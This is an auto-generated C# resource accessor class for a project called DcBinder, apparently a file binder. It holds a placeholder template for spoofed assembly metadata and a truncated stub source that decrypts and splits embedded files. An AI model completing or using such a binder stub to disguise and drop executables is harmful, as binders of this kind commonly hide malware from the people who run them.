﻿//------------------------------------------------------------------------------
// <auto-generated>
//     此代码由工具生成。
//     运行时版本:4.0.30319.42000
//
//     对此文件的更改可能会导致不正确的行为，并且如果
//     重新生成代码，这些更改将会丢失。
// </auto-generated>
//------------------------------------------------------------------------------

namespace DcBinder.Properties {
    using System;
    
    
    /// <summary>
    ///   一个强类型的资源类，用于查找本地化的字符串等。
    /// </summary>
    // 此类是由 StronglyTypedResourceBuilder
    // 类通过类似于 ResGen 或 Visual Studio 的工具自动生成的。
    // 若要添加或移除成员，请编辑 .ResX 文件，然后重新运行 ResGen
    // (以 /str 作为命令选项)，或重新生成 VS 项目。
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   返回此类使用的缓存的 ResourceManager 实例。
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("DcBinder.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   重写当前线程的 CurrentUICulture 属性，对
        ///   使用此强类型资源类的所有资源查找执行重写。
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   查找类似 [assembly: AssemblyTitle(&quot;[TITLE]&quot;)]
        ///[assembly: AssemblyDescription(&quot;[DESCRIPTION]&quot;)]
        ///[assembly: AssemblyCopyright(&quot;[COPYRIGHT]&quot;)]
        ///[assembly: AssemblyVersion(&quot;[VERSION]&quot;)]
        ///[assembly: AssemblyFileVersion(&quot;[FILE-VERSION]&quot;)]
        ///[assembly: AssemblyCompany(&quot;[COMPANY]&quot;)]
        ///[assembly: AssemblyProduct(&quot;[PRODUCT]&quot;)] 的本地化字符串。
        /// </summary>
        internal static string Assembly {
            get {
                return ResourceManager.GetString("Assembly", resourceCulture);
            }
        }
        
        /// <summary>
        ///   查找类似 using System;
        ///using System.Text;
        ///using System.IO;
        ///using System.Text.RegularExpressions;
        ///using System.Reflection;
        ///
        ///[AssemblyHere]
        ///
        ///namespace Ultimate
        ///{
        ///    class Ultimate
        ///    {
        ///		static void Main()
        ///        {
        ///            try
        ///            {
        ///                string files = &quot;%files%&quot;;
        ///                files = Decrypt(files);
        ///                string extensions = &quot;%ext%&quot;;
        ///                string[] file = Regex.Split(files, &quot;.deadline.&quot;);
        ///                string[] extension = extensions.Split(&apos;/&apos;);
        ///  [字符串的其余部分被截断]&quot;; 的本地化字符串。
        /// </summary>
        internal static string Source {
            get {
                return ResourceManager.GetString("Source", resourceCulture);
            }
        }
    }
}
